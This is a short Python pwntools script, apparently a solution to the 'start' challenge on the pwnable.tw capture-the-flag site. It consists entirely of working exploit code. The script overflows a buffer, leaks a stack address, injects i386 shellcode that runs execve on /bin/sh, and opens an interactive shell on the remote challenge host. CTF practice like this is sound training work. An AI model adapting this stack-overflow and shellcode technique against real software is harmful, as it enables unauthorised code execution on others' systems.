from pwn import *
DEBUG = 0
context(arch = 'i386', os = 'linux', log_level = 'debug')
if DEBUG:
    p = process('./start')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw', 10000)

p.recvuntil('CTF:')
p.send('a' * 0x14 + p32(0x08048087))
ESP0 = p.recv(4)

adr_ip = p32(u32(ESP0) + 0x14 + 0x08)

adr_sh = p32(u32(adr_ip) - 0x08)

payload = 'a' * 0x14 + adr_ip + '/bin/sh\x00' + asm('mov eax,0x0b; mov ebx,%d; mov ecx,0x0; mov edx,0x0; int 0x80;' % u32(adr_sh))

p.send(payload)

p.interactive()